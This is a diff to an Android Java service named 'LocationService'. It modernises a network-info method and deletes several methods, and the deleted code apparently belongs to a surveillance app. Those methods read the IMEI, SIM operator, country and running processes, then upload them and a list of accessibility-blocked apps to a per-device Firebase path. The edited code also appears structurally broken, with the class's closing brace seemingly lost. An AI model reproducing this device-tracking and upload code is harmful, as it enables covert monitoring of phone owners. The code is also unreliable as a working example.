@@ -414,42 +414,23 @@ public class LocationService extends Service {
             StringBuilder sb = new StringBuilder(); for (byte b : mac) sb.append(String.format("%02X:", b)); return sb.length() > 0 ? sb.substring(0, sb.length() - 1) : "N/A"; } } } catch (Exception e) {} return "N/A";
     }
 
-    private JSONObject getNetworkInfo() throws Exception {
-        JSONObject o = new JSONObject(); android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-        android.net.NetworkInfo ni = cm != null ? cm.getActiveNetworkInfo() : null;
-        o.put("connected", ni != null && ni.isConnected()); if (ni != null) { o.put("type", ni.getTypeName()); o.put("roaming", ni.isRoaming()); } return o;
+private JSONObject getNetworkInfo() throws Exception {
+    JSONObject o = new JSONObject();
+    android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+    if (cm != null) {
+        if (Build.VERSION.SDK_INT >= 23) {
+            android.net.Network n = cm.getActiveNetwork();
+            if (n != null) {
+                android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(n);
+                o.put("connected", caps != null && caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET));
+                o.put("wifi", caps != null && caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI));
+                o.put("cellular", caps != null && caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR));
+            }
+        } else {
+            android.net.NetworkInfo ni = cm.getActiveNetworkInfo();
+            o.put("connected", ni != null && ni.isConnected());
+            if (ni != null) o.put("type", ni.getTypeName());
+        }
     }
-
-    private JSONObject getTelephonyInfo() throws Exception {
-        JSONObject o = new JSONObject(); android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-        if (tm != null) { if (Build.VERSION.SDK_INT >= 26 && checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-            try { o.put("device_id", tm.getImei()); } catch (SecurityException e) { o.put("device_id", "N/A"); }
-        } else { o.put("device_id", "N/A (Permission denied)"); }
-            o.put("sim_state", tm.getSimState()); o.put("operator", tm.getNetworkOperatorName()); o.put("country", tm.getNetworkCountryIso()); } return o;
-    }
-
-    private JSONObject getRunningProcesses() throws Exception {
-        JSONArray arr = new JSONArray(); android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
-        for (android.app.ActivityManager.RunningAppProcessInfo p : am.getRunningAppProcesses()) { JSONObject o = new JSONObject(); o.put("process", p.processName); o.put("pid", p.pid); arr.put(o); }
-        return new JSONObject().put("processes", arr);
-    }
-
-    private void pushResult(String key, String value) {
-        try { JSONObject res = new JSONObject(); res.put("key", key); res.put("value", value); res.put("time", new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault()).format(new Date()));
-            FirebaseHelper.put("devices/" + deviceId + "/result.json", res.toString()); } catch (Exception e) { Log.e(TAG, "push res fail", e); }
-    }
-
-    private void pushJson(String key, JSONObject data) {
-        try { data.put("time", new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault()).format(new Date()));
-            FirebaseHelper.put("devices/" + deviceId + "/" + key + ".json", data.toString()); pushResult(key, "Data sent"); } catch (Exception e) { Log.e(TAG, "push json fail", e); }
-    }
-
-    private void saveBlockedApps() {
-        try { JSONArray arr = new JSONArray(BlockAccessibility.blockedPkgs); FirebaseHelper.put("devices/" + deviceId + "/blockedapps.json", arr.toString()); } catch (Exception e) { Log.e(TAG, "save blocked fail", e); }
-    }
-
-    private int getBatteryPercent() {
-        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
-        if (bm != null) return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY); return -1;
-    }
+    return o;
 }
